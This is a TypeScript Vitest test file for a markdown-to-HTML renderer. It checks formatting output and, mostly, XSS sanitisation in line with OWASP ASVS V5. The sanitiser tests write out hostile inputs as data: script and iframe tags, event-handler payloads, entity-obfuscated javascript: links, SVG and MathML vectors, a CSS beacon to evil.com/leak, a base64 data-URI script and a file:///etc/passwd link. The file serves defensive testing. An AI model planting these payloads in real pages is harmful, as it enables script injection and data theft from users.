import { describe, it, expect } from 'vitest';
import { MarkdownRenderer } from '../src/services/MarkdownRenderer';

describe('MarkdownRenderer (TDD, OWASP ASVS V5 & Guardrails)', () => {
  it('parses markdown bold syntax into HTML strong tags without raw syntax leaks', () => {
    const input = '1. **On-Device Execution**: Utilizing localized parsers.';
    const output = MarkdownRenderer.render(input);

    expect(output).toContain('<strong>On-Device Execution</strong>');
    expect(output).not.toContain('**');
  });

  it('parses code blocks with theme-adaptive CSS classes instead of inline hardcoded styles', () => {
    const input = '```kotlin\nval parser = LocalPdfParser()\n```';
    const output = MarkdownRenderer.render(input);

    // Must use CSS class .code-block for theme-adaptive styling
    expect(output).toContain('class="code-block"');

    // Guardrail: MUST NOT contain hardcoded inline hex style strings
    expect(output).not.toContain('background: #');
    expect(output).not.toContain('background:#');
    expect(output).not.toContain('style="background');
  });

  it('parses links, italics, and list items cleanly', () => {
    const input = '* [AI-Borne](https://ai-borne.in) - *Privacy-first* tools.';
    const output = MarkdownRenderer.render(input);

    expect(output).toContain('<a href="https://ai-borne.in"');
    expect(output).toContain('<em>Privacy-first</em>');
    expect(output).not.toContain('*Privacy-first*');
    expect(output).not.toContain('[AI-Borne]');
  });

  it('guardrail: ensures rendered HTML contains zero hardcoded inline hex colors', () => {
    const sampleMarkdown = `
# Title
## Subtitle
* Item with **bold text**
\`\`\`ts
const x = 1;
\`\`\`
    `;
    const html = MarkdownRenderer.render(sampleMarkdown);

    const hexColorRegex = /style="[^"]*#(?:[0-9a-fA-F]{3}){1,2}[^"]*"/;
    expect(hexColorRegex.test(html)).toBe(false);
  });

  it('neutralizes dangerous script, iframe, and form tags to prevent XSS', () => {
    const maliciousInput = `
# Blog Post
<script>alert('xss')</script>
<iframe src="https://evil.com"></iframe>
<form action="https://evil.com/steal"><input type="text"/></form>
<object data="data:text/html;base64,..."></object>
<embed src="evil.swf"/>
Normal content continues here.
    `;
    const sanitized = MarkdownRenderer.render(maliciousInput);

    expect(sanitized).not.toContain('<script');
    expect(sanitized).not.toContain('alert(\'xss\')');
    expect(sanitized).not.toContain('<iframe');
    expect(sanitized).not.toContain('<form');
    expect(sanitized).not.toContain('<object');
    expect(sanitized).not.toContain('<embed');
    expect(sanitized).toContain('Normal content continues here.');
  });

  it('strips inline event handlers from HTML tags', () => {
    const input = '<img src="valid.png" onerror="alert(1)" onload="evil()" />\n<p onclick="steal()">Text</p>';
    const output = MarkdownRenderer.render(input);

    expect(output).not.toContain('onerror=');
    expect(output).not.toContain('onload=');
    expect(output).not.toContain('onclick=');
    expect(output).toContain('src="valid.png"');
    expect(output).toContain('Text');
  });

  it('neutralizes dangerous javascript: URI links into safe href="#"', () => {
    const maliciousLink = '[Click me](javascript:alert("pwned"))';
    const output = MarkdownRenderer.render(maliciousLink);

    expect(output).not.toContain('href="javascript:');
    expect(output).toContain('href="#"');
    expect(output).toContain('Click me');
  });

  it('preserves code snippets containing script tags without executing or stripping them from code blocks', () => {
    const codeSnippet = '```html\n<script>console.log("safe example");</script>\n```';
    const output = MarkdownRenderer.render(codeSnippet);

    expect(output).toContain('class="code-block"');
    expect(output).toContain('&lt;script&gt;console.log(&quot;safe example&quot;);&lt;/script&gt;');
  });

  // OWASP ASVS V5 Attack Vector Tests (Phase 3 Hardening)
  it('eliminates nested script tag injections across recursive sanitization passes', () => {
    const nestedInput1 = '<scr<script>ipt>alert(1)</script>';
    const output1 = MarkdownRenderer.render(nestedInput1);
    expect(output1).not.toContain('<script');
    expect(output1).not.toContain('alert(1)');

    const nestedInput2 = '<script><script>alert(2)</script></script>';
    const output2 = MarkdownRenderer.render(nestedInput2);
    expect(output2).not.toContain('<script');
    expect(output2).not.toContain('alert(2)');
  });

  it('neutralizes SVG and MathML injection vectors', () => {
    const svgInput = '<svg onload=alert(1)>Click</svg>';
    const outputSvg = MarkdownRenderer.render(svgInput);
    expect(outputSvg).not.toContain('<svg');
    expect(outputSvg).not.toContain('onload');
    expect(outputSvg).not.toContain('alert(1)');

    const mathInput = '<math href="javascript:alert(2)"><mi>x</mi></math>';
    const outputMath = MarkdownRenderer.render(mathInput);
    expect(outputMath).not.toContain('<math');
    expect(outputMath).not.toContain('javascript:');
    expect(outputMath).not.toContain('alert(2)');
  });

  it('neutralizes encoded and obfuscated protocol bypasses in links', () => {
    // HTML entity tab obfuscation
    const entityTabInput = '<a href="jav&#x09;ascript:alert(1)">Click</a>';
    const outputTab = MarkdownRenderer.render(entityTabInput);
    expect(outputTab).toContain('href="#"');
    expect(outputTab).not.toContain('javascript:');
    expect(outputTab).toContain('Click');

    // Decimal entity obfuscation
    const entityDecInput = '<a href="&#106;&#97;vascript:alert(2)">Click</a>';
    const outputDec = MarkdownRenderer.render(entityDecInput);
    expect(outputDec).toContain('href="#"');
    expect(outputDec).not.toContain('javascript:');

    // Named colon entity obfuscation
    const entityColonInput = '<a href="javascript&colon;alert(3)">Click</a>';
    const outputColon = MarkdownRenderer.render(entityColonInput);
    expect(outputColon).toContain('href="#"');
    expect(outputColon).not.toContain('javascript:');
  });

  it('strips malformed tags with non-standard and whitespace-separated event handlers', () => {
    const malformedInput = '<img src=x onerror=alert(1)>';
    const outputMalformed = MarkdownRenderer.render(malformedInput);
    expect(outputMalformed).not.toContain('onerror');
    expect(outputMalformed).not.toContain('alert(1)');
    expect(outputMalformed).toContain('src=x');

    const nonStandardEvents = '<div onanimationstart="alert(2)" ontoggle="alert(3)" onfocusin="alert(4)">Content</div>';
    const outputEvents = MarkdownRenderer.render(nonStandardEvents);
    expect(outputEvents).not.toContain('onanimationstart');
    expect(outputEvents).not.toContain('ontoggle');
    expect(outputEvents).not.toContain('onfocusin');
    expect(outputEvents).toContain('Content');
  });

  it('eliminates CSS style exfiltration tags and payloads completely', () => {
    const styleInput = '<style>body{background:url("https://evil.com/leak")}</style>\n<p>Safe text</p>';
    const outputStyle = MarkdownRenderer.render(styleInput);
    expect(outputStyle).not.toContain('<style');
    expect(outputStyle).not.toContain('evil.com/leak');
    expect(outputStyle).toContain('<p>Safe text</p>');
  });

  it('neutralizes data URI HTML payloads and unsafe schemes into safe targets', () => {
    const dataHtmlInput = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Payload</a>';
    const outputData = MarkdownRenderer.render(dataHtmlInput);
    expect(outputData).toContain('href="#"');
    expect(outputData).not.toContain('data:text/html');
    expect(outputData).toContain('Payload');

    const vbscriptLink = '[VBS](vbscript:msgbox(1))';
    const outputVbs = MarkdownRenderer.render(vbscriptLink);
    expect(outputVbs).toContain('href="#"');
    expect(outputVbs).not.toContain('vbscript:');

    const fileLink = '[File](file:///etc/passwd)';
    const outputFile = MarkdownRenderer.render(fileLink);
    expect(outputFile).toContain('href="#"');
    expect(outputFile).not.toContain('file:');
  });
});
